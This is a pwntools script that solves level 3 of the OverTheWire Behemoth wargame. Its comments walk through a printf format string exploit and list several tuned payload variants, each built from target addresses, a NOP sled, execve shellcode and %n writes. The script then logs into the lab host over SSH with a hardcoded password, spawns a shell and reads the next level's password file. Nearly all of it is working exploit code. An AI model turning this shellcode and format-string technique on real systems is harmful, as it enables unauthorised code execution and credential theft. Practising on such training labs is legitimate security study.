from pwn import *

'''
local exploit:
    (python -c 'print "\xac\x97\x04\x08" + "\xae\x97\x04\x08" + "\x90" * 80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%55093u" + "%1$n" + "%10331u" + "%2$n"')
So, here we have a format string vulnerability within printf
Out exploit:
    Address to write + Address to write with additional 2 bytes + nop chain + shellcode + padding + %n specifier to write at the first 2 bytes + padding + %n specifier to write at the second 2 bytes
Exploit above is for the local binary on my machine, but here is the local exploit on the target:
    (python -c 'print "\xac\x97\x04\x08" + "\xae\x97\x04\x08" + "\x90" * 80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%54685u" + "%1$n" + "%10739u" + "%2$n"')
Okay, I just try to send it across the network.
I found the way to debug remotely!!!
Here the exploit:
    (python -c 'print "\xac\x97\x04\x08" + "\xae\x97\x04\x08" + "\x90" * 80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%56233u" + "%1$n" + "%9191u" + "%2$n"')
With unset LINES and COLUMNS:
    "\xac\x97\x04\x08" + "\xae\x97\x04\x08" + "\x90" * 80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%56253u" + "%1$n" + "%9171u" + "%2$n"
'''
con = ssh('behemoth3', 'behemoth.labs.overthewire.org', password='nieteidiel', port=2221)
p = con.process('/behemoth/behemoth3')
p.sendline("\xac\x97\x04\x08" + "\xae\x97\x04\x08" + "\x90" * 80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%56253u" + "%1$n" + "%9171u" + "%2$n")
#gdb.attach(p)
p.sendline('cat /etc/behemoth_pass/behemoth4')
p.recvuntil("$")
print(p.recvline())
